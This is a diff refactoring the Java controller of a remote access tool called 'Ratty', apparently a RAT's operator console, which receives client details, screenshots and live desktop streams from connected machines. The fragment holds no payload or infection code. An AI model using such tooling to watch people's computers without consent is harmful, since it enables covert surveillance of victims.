@@ -72,52 +72,65 @@ public final class RattyGuiController implements IServerObserver, IClientObserve
 	
 	@Override
 	public void packetReceived(final ActiveClient client, final IPacket packet) {
-		if (packet instanceof InformationPacket) {
-			final InformationPacket information = (InformationPacket)packet;
-			final long id = getServerClient(client).id;
-			final String name = information.getName();
-			final String address = client.getAddress();
-			final String os = information.getOS();
-			final String version = information.getVersion();
-			
-			gui.addTableRow(id, name, address, os, version);
-		} else if (packet instanceof ScreenshotPacket) {
-			final ScreenshotPacket screenshot = (ScreenshotPacket)packet;
-			final BufferedImage image = screenshot.getImage();
-			
-			gui.showImage(image);
-		} else if (packet instanceof DesktopStreamPacket) {
-			final ServerClient serverClient = getServerClient(client);
-			
-			if (serverClient.streamingDesktop) {
+		final ServerClient serverClient = getServerClient(client);
+		
+		if (serverClient.isLoggedIn()) {
+			if (packet instanceof ScreenshotPacket) {
+				final ScreenshotPacket screenshot = (ScreenshotPacket)packet;
+				final BufferedImage image = screenshot.getImage();
+				
+				serverClient.getDisplayPanel().showImage(image);
+			} else if (packet instanceof DesktopStreamPacket && serverClient.isStreamingDesktop()) {
 				final DesktopStreamPacket stream = (DesktopStreamPacket)packet;
 				final IFrame frame = stream.getFrame();
 				final int screenWidth = stream.getScreenWidth();
 				final int screenHeight = stream.getScreenHeight();
 				final DesktopStreamPacket request = new DesktopStreamPacket();
 				
-				gui.showFrame(frame, screenWidth, screenHeight);
-				
+				serverClient.getDisplayPanel().showFrame(frame, screenWidth, screenHeight);
 				client.addPacket(request);
+			} else {
+				packet.execute(client);
 			}
-		} else {
-			packet.execute(client);
+		} else if (packet instanceof InformationPacket) {
+			final InformationPacket information = (InformationPacket)packet;
+			final long id = serverClient.id;
+			final String name = information.getName();
+			final String address = client.getAddress();
+			final String os = information.getOs();
+			final String version = information.getVersion();
+			
+			serverClient.logIn(name, os, version);
+			gui.addTableRow(id, name, address, os, version);
 		}
 	}
 	
 	@Override
 	public void disconnected(final ActiveClient client) {
-		removeClient(client);
+		final long id = getServerClient(client).id;
+		
+		client.setObserver(null);
+		client.close();
+		clients.remove(client);
+		
+		gui.removeTableRow(id);
 	}
 	
 	@Override
 	public void clientConnected(final ActiveServer server, final ActiveClient client) {
-		addClient(client);
+		final long id = nextId++;
+		final ServerClient serverClient = new ServerClient(id, client);
+		final InformationPacket packet = new InformationPacket();
+		
+		client.setObserver(this);
+		clients.add(serverClient);
+		client.start();
+		client.addPacket(packet);
 	}
 	
 	@Override
 	public void closed(final ActiveServer server) {
-		System.out.println("Server closed");
+		//...
 	}
 	
 	@Override
@@ -132,47 +145,12 @@ public final class RattyGuiController implements IServerObserver, IClientObserve
 		}
 		
 		if (command == RattyGui.DESKTOP) {
-			serverClient.streamingDesktop = true;
+			serverClient.setStreamingDesktop(true);
 			gui.setStreaming(lastIdClicked, true);
 		} else if (command == RattyGui.DESKTOP_STOP) {
-			serverClient.streamingDesktop = false;
+			serverClient.setStreamingDesktop(false);
 			gui.setStreaming(lastIdClicked, false);
 		}
-	}
-	
-	public void addClient(final ActiveClient client) {
-		final long id = nextId++;
-		final ServerClient serverClient = new ServerClient(id, client);
-		final InformationPacket packet = new InformationPacket();
-		
-		client.setObserver(this);
-		clients.add(serverClient);
-		client.start();
-		client.addPacket(packet);
-	}
-	
-	public void removeClient(final ActiveClient client) {
-		final long id = getServerClient(client).id;
-		
-		client.setObserver(null);
-		client.close();
-		clients.remove(client);
-		
-		gui.removeTableRow(id);
-	}
-	
-	private final class ServerClient {
-		
-		private boolean streamingDesktop;
-		
-		final long id;
-		final ActiveClient client;
-		
-		public ServerClient(final long id, final ActiveClient client) {
-			this.id = id;
-			this.client = client;
-		}
-		
 	}
 	
 }
